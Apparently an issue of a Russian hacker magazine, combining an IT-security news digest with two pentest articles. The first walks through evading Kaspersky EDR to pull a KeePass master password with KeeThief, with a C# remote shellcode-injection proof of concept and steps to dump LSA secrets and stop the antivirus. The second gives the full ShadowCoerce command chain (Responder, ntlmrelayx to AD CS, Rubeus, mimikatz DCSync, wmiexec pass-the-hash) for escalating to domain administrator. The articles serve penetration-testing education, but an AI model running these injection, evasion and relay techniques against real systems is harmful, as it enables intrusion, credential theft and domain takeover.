   Помимо  количества  атак,  существенно  выросла и  их  продолжительность: если  в  фев‐
   рале 2022 года атаки в среднем длились около 7 часов (самая долгая — более 90 часов), то
   в марте средняя продолжительность атак составила более суток — 29,5 часа.

    Также был установлен рекорд максимальной продолжительности одной атаки за всю историю
   наблюдений: она продолжалась 145 часов, то есть чуть более 6 дней. Для сравнения: в фев‐
   рале и марте 2021 года средняя длительность инцидента не превышала 12 минут, а самая
    продолжительная атака длилась не более 1,5 часа.

    Наиболее подвержены атакам были государственные органы, финансовые организа-
  ции, образовательные учреждения и СМИ.





  В марте 2022 года самая большая нагрузка пришлась на финансовые организации, в первую
   очередь на банки: их доля в общем объеме атак выросла в три раза — до 35%.





 РОССИЯН
 БЛОКИРУЮТ
 НА GITHUB
  В начале апреля 2022 года «Сбер» и «Альфа‑Банк» попали под блокирующие
   санкции Минфина США, и теперь аккаунты банков на GitHub оказались
   забанены. Также о блокировках сообщают и частные разработчики, не имев‐
  шие отношения к банкам.
    В начале марте 2022 года администрация GitHub обещала не блокировать
  все аккаунты российских пользователей без разбора (хотя такие просьбы
   к GitHub поступали) и заверяла, что будет придерживаться законов, которые,
   впрочем, могли обязать компанию блокировать тех или иных разработчиков
   из‑за санкций и законов об экспорте.
     Как стало известно в середине апреля, на GitHub были заблокированы
   десятки аккаунтов, среди которых аккаунты «Сбербанка», «Альфа‑Банка»,
   других  компаний и даже  индивидуальных  разработчиков. В  частности,
  под     блокировку     попали:     https://github.com/Sberbank-Technology,
   https://github.com/sberbank-ai-lab и https://github.com/alfa-laboratory.
     Помимо компаний, под блокировками оказались и отдельные разработ‐
   чики. К примеру, о бане личных аккаунтов сообщили исследователи Сергей
   Бобров и Денис Колегов.
      После блокировки личного GitHub-аккаунта тот отмечается как suspended,
  а корпоративный — как flagged. В последнем варианте доступ к данным
   репозиториев может сохраняться в течение нескольких часов, тогда как дос‐
   туп к личным аккаунтам ограничивается сразу.
      После блокировки пользователи получили письма, в которых сказано, что
   их  аккаунт может управляться из  санкционного  региона. При переходе
  по ссылкам из писем им было предложено подать апелляцию и объяснить
   отношения компании или пользователя с Северной Кореей, Сирией, Кры‐
  мом, ЛНР и ДНР.





 МАСК НЕ ГОТОВ СОТРУДНИЧАТЬ С ГЕЙТСОМ
  В конце апреля журналисты слили в сеть личную переписку Билла Гейтса и Илона Маска, под‐
   линность которой вскоре подтвердил последний. В чате Билл Гейтс обратился к Илону Маску,
   предлагая ему обсудить благотворительность и вопросы изменения климата. Судя по утекшим
   в сеть скриншотам, сначала Маск не возражал против встречи и возможного сотрудничества,
   однако потом все пошло не по плану.

              «У вас все еще открыта короткая позиция на полмиллиарда долларов против →           Tesla?» — неожиданно поинтересовался Маск.
            «Жаль это признавать, но я все еще ее не закрыл. [Но] я хотел бы обсудить
           возможности благотворительности», — ответил Гейтс.
              «Извините, я не могу серьезно относиться к вашей благотворительности,
            связанной с изменением климата, когда у вас огромная короткая позиция про‐
          тив Tesla, компании, которая делает все для решения проблем климатических
           изменений», — заявил Маск, и на этом общение, похоже, прервалось.





   Позже Маск прокомментировал утечку в Twitter:

            «Я слышал от нескольких человек на TED, что у Гейтса все еще открыт шорт →          на полмиллиарда против Tesla, поэтому я и спросил его. Это совсем не секрет».





                                        Продолжение статьи →
← Начало статьи





 ИСХОДНИКИ YANDEX
 DATABASE ОТКРЫТЫ
   Компания «Яндекс» опубликовала исходный код распределенной системы
   управления базами данных Yandex Database (YDB). Технология позволяет
   создавать масштабируемые отказоустойчивые сервисы, способные выдер‐
  живать большую операционную нагрузку. Исходный код, документация, SDK
  и все  инструменты для работы с базой были опубликованы на GitHub
  под лицензией Apache 2.0.
    В компании рассказали, что YDB способна обрабатывать миллионы зап‐
  росов в секунду и сохраняет работоспособность в случае выхода из строя
   сервера или даже целого дата‑центра. Это обеспечивает стабильность соз‐
  данных на ее основе продуктов. Надежность YDB проверена и в масштабах
  самого Яндекса, где она используется уже больше пяти лет. Проекты в YDB
   размещают команды Алисы, Такси, Маркета, Метрики и других сервисов —
   сейчас в системе почти 500 проектов.
      Развернуть YDB можно как на собственных, так и на сторонних серверах —
   в том числе в Yandex Cloud или других облачных сервисах.

       «Мы уверены, что бурное развитие технологий, которое мы наблюда-
       ем в последние десятилетия, было бы невозможно без применения «
          открытого исходного кода. Доступность технологий способствует их
         распространению и стимулирует к ним интерес. Например, сейчас
        уже  нельзя  представить  себе  интернет  без  таких  баз  данных,
          как MySQL, PostgreSQL или ClickHouse. Публикуя код YDB, мы продол-
        жаем следовать принципам открытости и делимся со всеми наработ-
         ками, на которые потратили почти десять лет. Теперь технология,
         которая  позволяет Яндексу быстро  масштабироваться и  двигаться
          вперед,  будет  доступна всем  под  свободной  лицензией  Apache
           2.0», — комментирует Алексей Башкеев, генеральный директор Yandex
          Cloud.                 »
  По словам разработчиков, YDB решает задачи в одной из самых критичных
  областей — позволяет создавать интерактивные приложения, которые можно
   быстро масштабировать по нагрузке и по объему данных.

       «Мы разрабатывали ее, исходя из ключевых требований к сервисам
         Яндекса.  Во‑первых,  это  катастрофоустойчивость,  то  есть  воз- «
        можность продолжить работу без деградации при отключении одного
         из дата‑центров. Во‑вторых, это масштабируемость на десятки тысяч
          серверов на чтение и на запись. В‑третьих, это строгая консистен-
         тность данных», — гласит статья компании в блоге.                 »
  О решении открыть исходники в компании пишут так:


         «Открытие  проекта  создает интереснейшую для всех win-win-ситу-
         ацию. У сообщества, с одной стороны, появляется возможность поль- «
          зоваться уникальными наработками, в которые Яндекс инвестировал
           сотни  человеко‑лет,  познакомиться  с  кодом,  свободно  запускать
        и разрабатывать у себя решения на базе YDB. Технологии, позволя-
       ющие Яндексу развиваться быстрее, оперативно реагировать на рост
          нагрузок и масштабироваться, теперь доступны каждому. С другой
          стороны, сильно увеличится вариативность пользователей, мы смо-
       жем получить обратную связь от мирового сообщества и сделать базу
       еще лучше. Важно сломать барьер для пользователей, которые заин-
         тересованы в технологии, но останавливаются, опасаясь закрытости
         и/или невозможности использовать ее на своем оборудовании или в
           своих облаках».                 »

  БАНКИ ВОЗВРАЩАЮТ НЕ ВСЁ

  ЦБ РФ поделился интересной статистикой: за 2021 год банковские клиенты впервые перевели
   друг другу более 1 квадриллиона рублей, но из них 13,5 миллиарда рублей похитили
   мошенники. Увы, банкам удалось вернуть пострадавшим пользователям только 6,8% от этой
   суммы, или 920,5 миллиона рублей.

   Это худший показатель за два года. Для сравнения, в 2020 году банки вернули клиентам 11,3%
   от всего объема украденных мошенниками денег — 1,1 миллиарда рублей.

  В целом в 2021 году число и объем мошеннических переводов выросли на 33,8% и 38,8%
   по сравнению с показателями 2020 года. Доля мошеннических переводов в общем объеме
   операций составила 0,00130%.





 ВЗЛОМ METAMASK
   Создатели   криптокошелька  MetaMask   опубликовали   предупреждение
  для пользователей iOS, сообщив, что при включенном резервном копиро‐
  вании данных приложения seed криптовалютных кошельков  сохраняется
   в Apple iCloud. Это предупреждение появилось из‑за того, что один поль‐
  зователь MetaMask уже потерял более 655 тысяч долларов в результате
  хорошо продуманной фишинговой атаки.
      Напомню, что seed в криптовалютном мире — это секретная фраза вос‐
   становления, защищающая доступ к содержимому кошелька и состоящая
  из 12 слов.
    В Twitter разработчики сообщили, что, если злоумышленники проникнут
   в iCloud пользователя (с помощью фишинга или подобрав слишком слабый
   пароль), из‑за  хранящихся там бэкапов они  смогут  захватить контроль
  над кошельком и похитить чужие средства.
     К сожалению, такой сценарий уже использовался хакерами как минимум
   против   одного   пользователя  MetaMask,  который  в   итоге  лишил‐
  ся 655 388 долларов. Жертва получила несколько текстовых сообщений
  с просьбой сбросить учетные данные от учетной записи Apple, а затем зло‐
  умышленник позвонил с поддельного номера Apple Inc., представившись сот‐
   рудником службы поддержки, расследующим подозрительную активность.
      Пострадавший поверил мошенникам, выполнил все их инструкции и пре‐
   доставил  фейковым  специалистам  поддержки  шестизначный  код  под‐
   тверждения, полученный от Apple. Вскоре его кошелек MetaMask опустел.
  По сути, хакеры запросили сброс пароля от учетной записи Apple, и им тре‐
   бовалось лишь пройти дополнительную проверку для доступа к данным iCloud
   жертвы, где хранилась резервная копия MetaMask и нужный злоумышленни‐
  кам seed.
      Теперь пользователям настоятельно рекомендуют исключить MetaMask
  из резервных копий iCloud, изменив соответствующий параметр в настрой‐
   ках: Settings → Profile → iCloud → Manage Storage → Backups.


  28 ЛЕТ РУНЕТУ

   Так как днем рождения Рунета считается 7 апреля 1994 года, в этом месяце ему исполнилось
  28  лет. Количество доменных имен,  зарегистрированных в зоне .RU,  составляет более
  5 000 000, а в зоне .РФ — более 670 000.

   По данным вице‑премьера РФ Дмитрия Чернышенко, по итогам 2021 года ежемесячная ауди‐
   тория российского сегмента интернета превышает 100 000 000 человек, а это более 80%
   населения страны.

   Чернышенко уточняет, что около 90% пользователей интернета заходят в сеть каждый день,
   а среди молодых россиян в возрасте 12–24 лет этот показатель и вовсе приблизился к 95%.





 БАГ В GITLAB
  В начале  апреля  инженеры  GitLab  устранили  критическую  уязвимость,
  которая позволяла удаленным злоумышленникам получать доступ к учетным
  записям пользователей с помощью жестко заданных паролей. Проблема
  CVE-2022-1162 затрагивала как GitLab Community Edition (CE), так и Enterprise
   Edition (EE).
      Разработчики объясняют, что статические пароли по ошибке устанав‐
  ливались во время регистрации на основе OmniAuth в GitLab CE/EE.


        «Для   учетных  записей,   зарегистрированных  с  использованием
         OmniAuth  (например,  OAuth,  LDAP,  SAML)  в  GitLab  CE/EE  вер- «
        сий 14.7 до 14.7.7, 14.8 до 14.8.5 и 14.9 до 14.9.2, был установлен
          жестко закодированный пароль, в теории позволяющий злоумыш-
         ленникам захватывать учетные записи», — объясняет команда GitLab
         в бюллетене безопасности.                 »
   Чтобы    исправить    ситуацию,    команда    GitLab    удалила   файл
   lib/gitlab/password.rb, который использовался для назначения жестко закоди‐
   рованного пароля константе TEST_DEFAULT.
      Теперь GitLab призывает пользователей как можно скорее обновить все
   установки до последних версий (14.9.2, 14.8.5 или 14.7.7), чтобы защититься
   от возможных атак. Также разработчики добавили, что уже сбросили пароли
   некоторых пользователей GitLab.com, стремясь смягчить последствия CVE-
   2022-1162. При этом подчеркивается, что пока никаких признаков компро‐
   метации и эксплуатации этого бага хакерами обнаружено не было.


  КИБЕРАТАК В 2021 ГОДУ СТАЛО НА 6,5% БОЛЬШЕ
    Эксперты Positive Technologies подготовили отчет о киберугрозах 2021 года, отметив домини‐
   рование шифровальщиков среди вредоносного ПО, повышение интенсивности атак на крип‐
   тобиржи и появление критически опасных уязвимостей, которые сразу же эксплуатировались
   злоумышленниками во множестве организаций по всему миру.

   Общее количество атак в 2021 году увеличилось на 6,5% по сравнению с 2020 годом.
   При этом доля целевых атак в сравнении с прошлым годом выросла на 4 процентных пункта
   и составила 74% от общего количества.





   Как и в 2020 году, 86% всех атак были направлены на организации. В тройку наиболее часто
   атакуемых отраслей вошли госучреждения (16%), медучреждения (11%) и промышленные ком‐
   пании (10%).





   Чаще всего хакеры использовали малварь (63%), социальную инженерию (50%), а также экс‐
    плуатировали недостатки защиты и уязвимости в софте (32%).





   Среди вредоносов, которые использовались в атаках на компании, чаще всего встречались
   шифровальщики: они были задействованы в 60% случаев.

    Количество атак на криптобиржи также выросло на 44% в сравнении с 2020 годом. К тому же
   в прошлом году произошла одна из крупнейших краж криптовалюты в истории: злоумышленни‐
   ки похитили около 600 миллионов долларов у PolyNetwork.





 ДРАЙВЕРЫ AMD
 СЛУЧАЙНО
 РАЗГОНЯЮТ
 ПРОЦЕССОРЫ
   Компания AMD изучает проблему в своих графических драйверах, из‑за
  которой самопроизвольно меняется производительность процессоров AMD
   Ryzen. Ранее пользователи обнаружили, что в их настройках BIOS происходят
   необъяснимые изменения, которых они не делали.
      Существование этой странной проблемы представители AMD подтвер‐
  дили в беседе с журналистами сайта Tom’s Hardware. К сожалению, пока ком‐
  пания не предоставила никаких подробностей об ошибке в GPU-драйверах,
  а также не давала рекомендаций, как устранить ошибку, и не называла пред‐
   полагаемых сроков ее исправления.
      Пока известно лишь то, что проблема автоматического разгона затрагива‐
   ет пользователей, которые используют одновременно видеокарты и процес‐
  соры производства AMD, причем баг проявляется далеко не у всех.
      Если судить по тому, когда в сети появились первые сообщения об этой
   ошибке, можно предположить, что проблема возникла в AMD Adrenalin вер‐
  сии 22.3.1, выпущенной 17 марта 2022 года. Интересно, что компания AMD
  уже выпустила Adrenalin Edition 22.4.1, однако в примечаниях к этому релизу
   нет никаких упоминаний об ошибках, поэтому неясно, устраняет ли новая
   версия баги.
      Пока всем, кто использует драйвер Adrenalin, рекомендуется обновить его
  до последней доступной версии и надеяться, что AMD незаметно устранит
   баг с помощью срочного патча.
      Пользователи Reddit и вовсе предлагают бороться с багом, создавая
  новые профили настроек, так как замена старых сохраненных профилей
  на новые порой помогает. Еще один обходной путь — удалить Ryzen Master
  SDK из Adrenalin, так как именно этот компонент позволяет модулям драйвера
   вносить изменения в настройки BIOS и предназначен для облегчения доступа
   к разгону процессора.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   На хакерских форумах набирает популярность похититель паролей BlackGuard


   MailChimp взломали, и мошенники атаковали пользователей кошельков Trezor


   Роскомнадзор запретил рекламировать ресурсы Google


   Apple оставила без исправлений критические баги в macOS Big Sur и Catalina


   Вредоносный сервис Parrot TDS использует 16 500 сайтов для распространения малвари


   Утекшие исходники шифровальщика Conti используются для атак на российские компании


    Разработчики браузера Brave считают страницы Google AMP вредными для конфиденциальнос‐
   ти


   «Сбербанк» блокировал масштабную атаку на банковские карты россиян


   Обнаружен подпольный маркетплейс Industrial Spy, торгующий данными


   Приложения для видеоконференций «слушают» пользователей даже после нажатия кнопки Mute
COVERSTORY
ВЫЗОВ
  МАСТЕРУ КЛЮЧЕЙ





    ИНЖЕКТИМ ШЕЛЛ-КОД В ПАМЯТЬ
     KEEPASS, ОБОЙДЯ АНТИВИРУС





Недавно на пентесте мне понадобилось
вытащить  мастер‑пароль  открытой базы
данных  KeePass  из  памяти   процесса
с помощью утилиты KeeThief из арсенала
GhostPack. Все бы ничего, да вот EDR, сле‐        Безопасник,snovvcrashвременами
дящий   за   системой,    категорически        криптоана(рхист)литик,питонщик, местами по
не  давал  мне  этого  сделать —  ведь       необходимостиадминистраторсистемный
под капотом KeeThief живет классическая        snovvcrash@protonmail.ch
процедура инъекции шелл‑кода в удален‐
ный  процесс,  что  не  может  остаться
незамеченным в 2022 году.


В этой статье мы рассмотрим замечательный сторонний механизм D/Invoke
для C#, позволяющий эффективно дергать Windows API в обход средств
защиты, и перепишем KeeThief, чтобы его не ловил великий и ужасный «Кас‐
перский». Погнали!


ПРЕДЫСТОРИЯ
В общем, пребываю я на внутряке, домен‑админ уже пойман и наказан,
но вот осталась одна вредная база данных KeePass, которая, конечно же,
не захотела сбрутиться с помощью hashcat и keepass2john.py. В KeePass —
доступы к критически важным ресурсам инфры, определяющим исход внут‐
ряка, поэтому добраться до нее нужно. На рабочей станции, где пользак кру‐
тит интересующую нас базу, глядит в оба Kaspersky Endpoint Security (он же
KES), который не дает  расслабиться. Рассмотрим, какие есть варианты
получить желанный мастер‑пароль, не прибегая к социнженерии.
   Прежде всего скажу, что успех этого предприятия — в обязательном
использовании крутой малвари KeeThief из коллекции GhostPack авторства
небезызвестных  @harmj0y  и  @tifkin_.  Ядро  программы —  кастомный
шелл‑код, который вызывает RtlDecryptMemory в отношении зашифрованной
области виртуальной памяти KeePass.exe и выдергивает оттуда наш мас‐
тер‑пароль. Если есть шелл‑код, нужен и загрузчик, и с этим возникают труд‐
ности, когда на хосте присутствует EDR...
   Впрочем, мы отвлеклись. Какие были варианты?


Потушить AV
Самый простой (и глупый) способ — вырубить к чертям «Касперского»
на пару секунд. «Это не редтим, поэтому право имею!» — подумал я. Так
как привилегии администратора домена есть, есть и доступ к серверу адми‐
нистрирования KES. Следовательно, и к учетке KlScSvc (в этом случае
использовалась локальная УЗ), креды от которой хранятся среди секретов
LSA в плейнтексте.
   Порядок действий простой. Дампаю LSA с помощью secretsdump.py.





                           Потрошим LSA

Гружу консоль администрирования KES с официального сайта и логинюсь,
указав хостнейм KSC.





                     Консоль администрирования KES

Стопорю «Каспера» и делаю свои грязные делишки.





                 AdobeHelperAgent.exe, ну вы поняли, ага

Profit! Мастер‑пароль у нас. После окончания проекта я опробовал другие
способы решить эту задачу.


Получить сессию C2
Многие C2-фреймворки умеют тащить за собой DLL рантайма кода C#
(Common Language Runtime, CLR) и загружать ее отраженно по принципу RDI
(Reflective DLL  Injection) для  запуска малвари из памяти.  Теоретически
это может повлиять на процесс отлова управляемого кода, исполняемого
через такой трюк.
   Полноценную сессию Meterpreter при активном антивирусе Касперского
получить трудно из‑за обилия артефактов в сетевом трафике, поэтому его
execute-assembly я даже пробовать не стал. А вот модуль execute-assembly
Cobalt  Strike принес свои результаты, если правильно получить сессию
beacon (далее скриншоты будут с домашнего KIS, а не KES, но все техники
работают и против последнего — проверено).





                KeeTheft.exe с помощью execute-assembly CS

Все козыри раскрывать не буду — мне еще работать пентестером, однако
этот метод тоже не представляет большого интереса в нашей ситуации.
Для гладкого получения сессии «маячка» нужен внешний сервак, на который
надо  накрутить  валидный  сертификат  для  шифрования  SSL-трафика,
а заражать таким образом машину с внутреннего периметра заказчика —
совсем невежливо.


Перепаять инструмент
Самый интересный и в то же время трудозатратный способ — переписать
логику инъекции шелл‑кода таким образом, чтобы EDR не спалил в момент
исполнения. Это то, ради чего мы сегодня собрались, но для начала немного
теории.


Примечание
Дело здесь именно в уклонении от эвристического анализа, так как, если
спрятать сигнатуру малвари с помощью недетектируемого упаковщика, дос‐
туп к памяти нам все равно будет запрещен из‑за фейла инъекции.





            Запуск криптованного KeeTheft.exe при активном EDR





                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИCOVERSTORY
    ВЫЗОВ МАСТЕРУ
          КЛЮЧЕЙ
          ИНЖЕКТИМ ШЕЛЛ-КОД В ПАМЯТЬ KEEPASS,
                         ОБОЙДЯ АНТИВИРУС





КЛАССИЧЕСКАЯ ИНЪЕКЦИЯ ШЕЛЛ-КОДА
Оглянемся назад и рассмотрим классическую технику внедрения стороннего
кода в удаленный процесс. Для этого наши предки пользовались священным
трио Win32 API:
 • VirtualAllocEx — выделить место в виртуальной памяти удаленного процес‐
   са под наш шелл‑код.
 • WriteProcessMemory — записать байты шелл‑кода в выделенную область
   памяти.
 • CreateRemoteThread — запустить новый поток в удаленном процессе,
   который стартует свежезаписанный шелл‑код.





  Исполнение шелл‑кода с помощью Thread Execution (изображение —
   elastic.co)

Напишем простой PoC на C#, демонстрирующий эту самую классическую
инъекцию шелл‑кода.


using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace SimpleInjector
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling
= true)]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling
= true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);


        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);


        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);


        public static void Main()
        {
            // msfvenom -p windows/x64/messagebox TITLE='MSF'
TEXT='Hack the Planet!' EXITFUNC=thread -f csharp
            byte[] buf = new byte[] { };


            // Получаем PID процесса explorer.exe
            int processId = Process.GetProcessesByName("explorer")[0]
.Id;


            // Получаем хендл процесса по его PID (0x001F0FFF =
PROCESS_ALL_ACCESS)
            IntPtr hProcess = OpenProcess(0x001F0FFF, false,
processId);


            // Выделяем область памяти 0x1000 байт (0x3000 =
MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE)
            IntPtr allocAddr = VirtualAllocEx(hProcess, IntPtr.Zero,
0x1000, 0x3000, 0x40);


            // Записываем шелл-код в выделенную область
            _ = WriteProcessMemory(hProcess, allocAddr, buf, buf.
Length, out _);


            // Запускаем поток
            _ = CreateRemoteThread(hProcess, IntPtr.Zero, 0,
allocAddr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}

Скомпилировав и запустив инжектор, с помощью Process Hacker можно наб‐
людать, как в процессе explorer.exe запустится новый поток, рисующий нам
диалоговое окно MSF.





                      Классическая инъекция шелл‑кода

Если просто положить такой бинарь на диск с активным средством анти‐
вирусной защиты, реакция будет незамедлительной независимо от содер‐
жимого массива buf, то есть нашего шелл‑кода. Все дело в комбинации
потенциально опасных вызовов Win32 API, которые заведомо используются
в большом количестве зловредов. Для демонстрации я перекомпилирую
инжектор с пустым массивом buf и залью результат на VirusTotal. Реакция
ресурса говорит сама за себя.





                                VirusTotal намекает...

Как антивирусное ПО понимает, что перед ним инжектор, даже без динами‐
ческого анализа? Все просто:  пачка атрибутов DllImport, занимающих
половину нашего исходника, кричит об этом на всю деревню. Например,
с помощью такого волшебного кода на PowerShell я могу посмотреть все
импорты в бинаре .NET.


Примечание
Здесь используется сборка System.Reflection.Metadata, доступная «из
коробки» в PowerShell Core. Установка описана в документации Microsoft.



$assembly = "C:\Users\snovvcrash\source\repos\SimpleInjector\bin\x64\
Release\SimpleInjector.exe"
$stream = [System.IO.File]::OpenRead($assembly)
$peReader = [System.Reflection.PortableExecutable.PEReader]::new(
$stream, [System.Reflection.PortableExecutable.PEStreamOptions]::
LeaveOpen -bor [System.Reflection.PortableExecutable.PEStreamOptions
]::PrefetchMetadata)
$metadataReader = [System.Reflection.Metadata.PEReaderExtensions]::
GetMetadataReader($peReader)
$assemblyDefinition = $metadataReader.GetAssemblyDefinition()


foreach($typeHandler in $metadataReader.TypeDefinitions) {
    $typeDef = $metadataReader.GetTypeDefinition($typeHandler)
    foreach($methodHandler in $typeDef.GetMethods()) {
        $methodDef = $metadataReader.GetMethodDefinition(
$methodHandler)


        $import = $methodDef.GetImport()
        if ($import.Module.IsNil) {
            continue
        }


        $dllImportFuncName = $metadataReader.GetString($import.Name)
        $dllImportParameters = $import.Attributes.ToString()
        $dllImportPath = $metadataReader.GetString($metadataReader.
GetModuleReference($import.Module).Name)
        Write-Host "$dllImportPath, $dllImportParameters`n
$dllImportFuncName`n"
    }
}





                  Смотрим импорты в SimpleInjector.exe


             INFO

                      Эти импорты представляют собой способ вза‐
                          имодействия приложений .NET с неуправляемым
                      кодом — таким, например, как функции библиотек
                   user32.dll, kernel32.dll. Этот механизм
                         называется    P/Invoke    (Platform    Invocation
                           Services), а сами сигнатуры импортируемых фун‐
                       кций с набором  аргументов и типом  возвра‐
                        щаемого  значения  можно   найти  на   сайте
                          pinvoke.net.


При анализе этого добра в динамике, как ты понимаешь, дела обстоят
еще проще: так как все EDR имеют привычку вешать хуки на userland-
интерфейсы, вызовы подозрительных API сразу поднимут тревогу. Подробнее
об этом можно почитать в ресерче @ShitSecure, а в лабораторных условиях
хукинг нагляднее всего продемонстрировать с помощью API Monitor.





                    Хукаем kernel32.dll в SimpleInjector.exe

Итак, что же со всем этим делать?


                                     Продолжение статьи →
ВЗЛОМ

SHADOWCOERCE

       КАК РАБОТАЕТ НОВАЯ АТАКА
         НА ACTIVE DIRECTORY





                                             AYSerkov
                                            Пентестер в компании T-
                                                       Hunter
                                              1215poppunk@mail.ru





В этой статье я покажу, как работает атака ShadowCoerce,
которая  использует  службу  теневого копирования (VSS)
и позволяет принудить учетку контроллера домена Active
Directory авторизоваться на узле злоумышленника. А это,
как ты догадываешься, может привести к захвату домена.


PETITPOTAM И PRINTERBUG
Ранее в тех же целях применялись техники PetitPotam и PrinterBug.
   PetitPotam  использовал  функцию  EfsRpcOpenFileRaw  из  протокола
Microsoft Encrypting File System Remote Protocol (MS-EFSRPC), который пред‐
назначен для выполнения операций с зашифрованными данными, хранящи‐
мися в удаленных системах.
   PrinterBug                    злоупотреблял                     функцией
RpcRemoteFindFirstPrinterChangeNotificationEx в протоколе Microsoft
Print System Remote Protocol (MS-RPRN). При атаке пользователь домена
может заставить любую машину, на которой запущена служба очереди
печати, подключиться к машине со включенным неограниченным делегирова‐
нием. Для эксплуатации этого бага применяется инструмент Krbrelayx.


        WWW

                        Подробнее об этих уязвимостях:
                       •Compromising a Domain With  the Help  of a
                           Spooler
                          •Захват контроллера домена с помощью атаки
                           PetitPotam


ShadowCoerce — новый способ принудительной аутентификации. Он исполь‐
зует протокол службы теневого копирования VSS (MS-FSRVP). Но прежде чем
говорить о нем, расскажу пару слов о самой VSS.


ЧТО ТАКОЕ VSS
Volume Shadow Copy Service (VSS) — это фича Windows Server, которая поз‐
воляет тихо, незаметно и централизованно бэкапить пользовательские дан‐
ные.
   Представь, что у тебя есть файловый сервер, бэкап которого делается
ежедневно. Утром ты внес изменения в критически важный документ, а в кон‐
це рабочего дня что‑то напутал и случайно удалил этот файл. Восстановить
его из бэкапа будет невозможно, так как в утреннюю сессию он не попал.
Однако если на сервере включена служба VSS, то можно не торопиться
ломать клавиатуру об колено и кидать монитор в окошко — файл можно будет
спасти!
  По сути, VSS копирует всю информацию, хранящуюся на диске, но при
этом отслеживает изменения и берет только нужные блоки. Сами копии дела‐
ются  автоматически  каждый  час, и по  умолчанию Windows  хранит  их
в количестве 64 штук. VSS — штука удобная и повсеместно используется
в доменных сетях.


СТЕНД
Для проведения атаки нам понадобится тестовый стенд:
 • контроллер домена (DC) — Windows Server 2016;
 • центр сертификации (AD CS) — Windows Server 2016 с включенной служ‐
  бой Web Enrollment;
 • скомпрометированная учетная запись пользователя с низкими привиле‐
   гиями.

Судя по документации Microsoft, протокол удаленного файлового сервера
VSS (MS-FSRVP):
 • создает теневые копии файловых ресурсов на удаленных компьютерах;
 • делает резервное копирование приложений;
 • восстанавливает данные на файловых ресурсах SMB2.

Чтобы наш контроллер домена начал делать теневые копии, нужно установить
службу агента VSS из меню «Роли сервера».





На момент написания статьи известны только две уязвимые функции, которые
обрабатывает MS-FSRVP: IsPathSupported и IsPathShadowCopied. Именно
они позволяют поднять наши права, так как обе работают с удаленными
путями UNC.


КАК РАБОТАЕТ SHADOWCOERCE
Для ShadowCoerce доступен PoC, который демонстрирует злоупотребление
этими функциями. Исполнение кода заставляет учетную запись контроллера
домена запросить общий ресурс NETLOGON или SYSVOL из системы,
находящейся под контролем злоумышленника. Принудительная аутентифика‐
ция выполняется через SMB, в отличие от других подобных методов принуж‐
дения (PrinterBug и PetitPotam).





При эксплуатации уязвимости NTLMv2-хеш учетной записи хоста контроллера
домена оказывается захвачен. Затем этот хеш передается в центр сер‐
тификации, чтобы зарегистрировать сертификат. После чего его можно
использовать для аутентификации на контроллере домена через службу
Kerberos.
  В журнале событий контроллера домена видим, как запускается сам про‐
цесс и служба VSS.





               Подключение к сетевому ресурсу от имени user





                    Запуск процесса fssagent и службы VSS





Давай разберем сам процесс атаки ShadowCoerce.





Для ее проведения злоумышленник выполняет следующие действия.
 1. Подключается к сетевому ресурсу с помощью эксплоита и злоупотребляет
   функциями IsPathSupported и IsPathShadowCopied в протоколе MS-
   FSRVP.
 2. Получает NTLMv2-хеш от контроллера домена (SMB). Вредоносный код
   принуждает учетную запись контроллера домена к аутентификации по про‐
   токолу SMB на захваченном компьютере.
 3. Перенаправляет хеш в центр сертификации (LDAP).
 4. Получает сертификат в Base64.


ЭКСПЛУАТАЦИЯ
Теперь я покажу, как выглядит сама эксплуатация.
   Чтобы проверить, что служба VSS работает, попытаемся перехватить
NTLMv2 с помощью Responder.


sudo responder -I eth0 -e <ip слушателя> -b -A -v

Нам понадобятся учетные данные любого пользователя домена, IP-адрес
слушателя и IP-адрес контроллера домена. Пусть тебя не пугает ошибка под‐
ключения при первом запуске.


python3 shadowcoerce.py -d "домен" -u "имя пользователя" -p "пароль"
<IP слушателя> <IP контроллера домена>





Поскольку на Kali мы слушаем SMB, нами будет захвачен хеш NTLMv2 учетной
записи компьютера контроллера домена.





Если в домене есть центр сертификации, а он у нас есть, мы можем перенап‐
равить на него NTLMv2-хеш через протокол HTTP. Идея в том, чтобы сместить
наш вектор в сторону получения сертификата, так как использовать его будет
проще, чем Net-NTLMv2-хеш.


python3 ntlmrelayx.py -t http://<IP центра сертификации>/certsrv/
certfnsh.asp -smb2support --adcs --template DomainController





После успешной атаки нам будет выдан сертификат в Base64.





Используя сертификат, мы можем запросить билет TGT (Ticket-Granting Ticket,
«билет на получение билета») для учетной записи контроллера домена (DC1)
с помощью инструмента под названием Rubeus.


Rubeus.exe asktgt /user:DC1$ /certificate:<сертификат в Base64> /ptt





Наличие TGT для учетки контроллера домена эквивалентно правам локаль‐
ного администратора. TGT может быть использован, например, для проведе‐
ния атаки DCSync c последующим закреплением в домене с помощью Golden
ticket.
  С помощью утилиты mimikatz проведем атаку DCSync и заберем NTLM-
хеш администратора домена.
   Администратором домена на нашем стенде является пользователь TH.





lsadump::dcsync /domain:домен /user:пользователь





python3 wmiexec.py -hashes :NTLM хеш пользователя@<
IP контроллера домена>





ВЫВОДЫ
Мы  подняли  привилегии с  простого  пользователя до  администратора
домена. Для  этого нам понадобилась всего одна действующая учетная
запись и пара команд в консоли.
   Атаки ретрансляции NTLM существуют уже довольно давно, но, как мы
видим, исследователи ежегодно находят новые обходные пути для эксплуата‐
ции. Примечательно, что эта атака, в отличие от прошлых, не использует уяз‐
вимые функции в протоколе RPC, а опирается на протокол общего доступа
к файлам SMB.
